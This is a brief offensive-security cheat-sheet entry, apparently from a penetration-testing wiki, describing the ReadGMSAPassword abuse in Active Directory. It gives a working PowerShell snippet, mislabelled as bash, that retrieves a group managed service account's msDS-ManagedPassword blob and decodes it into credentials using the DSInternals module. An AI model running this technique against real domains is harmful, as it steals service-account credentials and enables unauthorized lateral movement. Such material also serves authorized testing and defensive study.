# ReadGMSAPassword

This abuse can be carried out when controlling an object that has `AllExtendedRights` over a target computer.

The attacker can read the GMSA password of the account. This can be achieved with the Active Directory and DSInternals PowerShell modules.

```bash
# Save the blob to a variable
$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

# Decode the data structure using the DSInternals module
ConvertFrom-ADManagedPasswordBlob $mp
```

